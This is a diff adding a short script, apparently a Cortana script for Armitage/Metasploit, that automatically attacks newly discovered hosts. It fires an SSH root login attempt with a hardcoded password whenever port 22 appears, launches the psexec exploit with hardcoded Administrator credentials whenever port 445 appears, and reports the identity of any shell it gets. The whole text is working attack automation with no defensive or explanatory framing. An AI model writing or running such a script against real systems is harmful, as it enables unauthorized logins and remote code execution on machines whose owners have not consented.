@@ -1,0 +1,18 @@
+on service_add_22 {
+	println("$1");
+	auxiliary("scanner/ssh/ssh_login", @($1), %(
+		PASSWORD => "whoami",
+		USERNAME => "root")
+	);
+}
+on service_add_445 {
+	println("$1");
+	exploit("windows/smb/psexec", @($1), %(
+		SMBUser => "Administrator",
+		SMBPass => "Changeme14",
+		RHOST => $1)
+	);
+}
+on shell_whoami {
+	println("[ $+ $1 $+ ] I am: $3");
+}
